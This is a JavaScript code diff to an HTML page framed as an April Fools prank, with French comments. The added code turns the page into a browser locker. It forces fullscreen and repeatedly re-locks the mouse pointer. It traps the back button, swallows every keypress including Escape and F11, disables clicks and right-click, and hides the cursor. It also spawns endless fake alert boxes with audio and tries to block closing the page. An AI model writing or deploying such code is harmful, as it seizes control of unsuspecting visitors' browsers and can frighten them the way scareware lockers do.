@@ -111,17 +111,51 @@
                 if (audio.paused) audio.play().catch(e => { });
             }, 50);
 
-            // Bloquer l'écran (Plein écran)
-            if (document.documentElement.requestFullscreen) {
-                document.documentElement.requestFullscreen().catch(e => { });
-            } else if (document.documentElement.webkitRequestFullscreen) {
-                document.documentElement.webkitRequestFullscreen();
+            var el = document.documentElement;
+
+            // 1. Bloquer l'écran (Plein écran forcé)
+            var rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+            if (rfs) {
+                rfs.call(el).catch(e => { });
             }
+
+            // 2. Bloquer la souris (Pointer Lock) pour que l'utilisateur ne puisse plus bouger son curseur
+            var requestPointerLock = el.requestPointerLock || el.mozRequestPointerLock || el.webkitRequestPointerLock;
+            if (requestPointerLock) {
+                requestPointerLock.call(el);
+            }
+            // Essayer de le re-bloquer si on perd le lock
+            setInterval(function() {
+                if(!document.pointerLockElement && requestPointerLock) {
+                    requestPointerLock.call(el).catch(e => {});
+                }
+            }, 1000);
+
+            // 3. Piège du bouton "Retour" de l'historique du navigateur
+            history.pushState(null, null, location.href);
+            window.addEventListener('popstate', function () {
+                history.pushState(null, null, location.href);
+            });
+
+            // 4. Bloquer absolument tout le clavier (Echap, F5, F11, touches Windows, Command...)
+            document.addEventListener('keydown', function (e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+
+            // 5. Désactiver les sélections et clics pour stopper l'interaction normale
+            document.addEventListener('contextmenu', event => event.preventDefault());
+            document.addEventListener('mousedown', function (e) { 
+                e.preventDefault(); 
+            }, false);
 
             // Remplacer alert() par un spam d'alertes HTML sur la page pour NE PAS bloquer le son
             document.body.innerHTML = "";
             document.body.style.overflow = "hidden";
             document.body.style.backgroundColor = "black";
+            // Forcer le curseur à disparaître même si le pointerLock échoue
+            document.body.style.cursor = "none"; 
 
             // Spam infini de fausses fenêtres d'alerte
             setInterval(function () {
@@ -140,25 +174,21 @@
                 div.style.boxShadow = "0 10px 25px rgba(0,0,0,0.8)";
                 div.style.fontWeight = "bold";
                 div.style.zIndex = Math.floor(Math.random() * 10000);
-                div.style.cursor = "not-allowed";
                 div.style.userSelect = "none";
+                // On met div.style.cursor à "none"
+                div.style.cursor = "none";
                 div.innerHTML = "⚠️ KOTAZO !!! 🐟🐟🐟<br><br>Poisson d'avril ! Tu cherches quel dossier chaud ? 😂";
-
-                // Si on essaie de cliquer dessus pour fermer, rien ne se passe (ou on peut en spawn davantage)
-                div.onclick = function (e) {
-                    e.stopPropagation();
-                };
 
                 document.body.appendChild(div);
             }, 100);
 
-            // Désactiver le clic droit
-            document.addEventListener('contextmenu', event => event.preventDefault());
-
             // Tenter d'empêcher la fermeture
-            window.onbeforeunload = function () {
-                return "Impossible de fuir, le son est bloqué à fond !";
-            };
+            window.addEventListener('beforeunload', function (e) {
+                // Manière standard moderne : annuler l'event, mettre le returnValue
+                e.preventDefault();
+                e.returnValue = "Impossible de fuir, le son est bloqué à fond !";
+                return e.returnValue;
+            });
         }
     </script>
 </body>
